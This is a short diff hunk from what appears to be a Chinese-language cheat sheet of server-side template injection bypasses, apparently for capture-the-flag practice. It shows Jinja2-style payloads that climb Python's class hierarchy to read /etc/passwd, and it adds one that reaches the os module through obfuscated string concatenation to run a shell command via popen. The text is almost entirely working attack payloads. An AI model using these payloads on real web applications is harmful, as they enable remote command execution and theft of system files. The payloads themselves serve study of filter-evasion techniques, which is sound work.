@@ -399,6 +399,7 @@ x1=__class__&x2=__base__&x3=__subclasses__&x4=__init__&x5=__globals__&x6=__getit
 ```python
 {{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
 {{''['__c'+'lass__'].__base__.__subclasses__()[40]("/etc/passwd").read()}}
+{{[].__class__.__base__.__subclasses__()[80].__init__.__globals__["s".__add__("ys")].modules["o".__add__("s")].popen('cat /flag').read()}}
 ```
 ### 字符串翻转绕过
 ```python
